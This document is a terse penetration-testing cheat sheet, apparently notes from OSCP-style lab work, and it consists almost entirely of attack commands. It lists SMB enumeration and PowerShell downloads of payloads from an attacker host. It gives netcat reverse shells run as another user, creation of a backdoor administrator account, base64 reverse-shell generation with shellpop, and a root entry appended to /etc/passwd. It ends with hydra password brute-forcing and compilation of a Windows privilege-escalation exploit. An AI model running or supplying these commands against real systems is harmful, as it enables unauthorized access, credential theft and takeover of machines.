#### SMB commands
smbmap -H 10.11.1.x -u null -p ""   
smbmap -H 10.11.1.x -u null -p "" -R    
smbclient \\\\\\\10.11.1.x\\\\'Bob Share' ""    

#### SMB file transfer
python /git/tools/impacket/examples/smbserver.py myshare /usr/share/priv/windows/   
net view \\\\10.11.0.x    
copy \\\\10.11.0.x\\shell.php    

#### xp_cmdshell
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd="net user" 10.11.1.x

#### transfer files
powershell -c (Invoke-WebRequest -Uri 'http://10.11.0.x/rev.exe' -OutFile 'C:\Users\Public\rev.exe')    
powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.11.0.x/shell.exe','C:\Users\Public\shell.exe')   

#### execute cmd as another user 
psexec.exe -u alice -p some-pass "c:\Users\Public\nc.exe" 10.11.0.x 443 -e cmd.exe

#### execute nc as another user
$passwd = ConvertTo-SecureString "some-pass" -AsPlainText -Force   
$mycreds = New-Object System.Management.Automation.PSCredential ("alice", $passwd)    
$computer = "bethany"    
[System.Diagnostics.Process]::Start("C:\Users\Public\nc.exe"," -nvv 10.11.0.x 8082 -e cmd.exe",    
$mycreds.Username, $mycreds.Password, $computer)   

#### add windows admin user
net user sl0wly sl0wly /add   
net localgroup administrators sl0wly /add    

#### shellpop
shellpop --list 

#### shellpop reverse tcp
shellpop --payload linux/reverse/tcp/bash --host tap0 --port 443 --base64      
shellpop --payload linux/reverse/tcp/php --host tap0 --port 443     
shellpop --payload windows/reverse/tcp/powershell --host tap0 --port 443 --base64      

### Find all SUID
find / -perm -u=s -type f 2>/dev/null


#### /etc/passwd writeable
echo 'slow:aaKNIEDOaueR6:0:0:slow:/root:/bin/bash' >> /etc/passwd   
su slow   
(foo)  

#### RDP
rdesktop -u sl0wly 10.11.1.x

#### HYDRA BF
hydra -l root -P /usr/share/wordlist/rockyou.txt -T 20 10.11.1.x ssh     
hydra -s 27900 -C /usr/share/wordlist/sparta/mssql-default-userpass.txt -f 10.11.1.x mssql   

#### compling .exe on kali
i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32

#### TMUX 
tmux new-session -d -s alice s    
tmux send-keys -t alice "AR 10.11.1.x -o /git/oscp/labs"



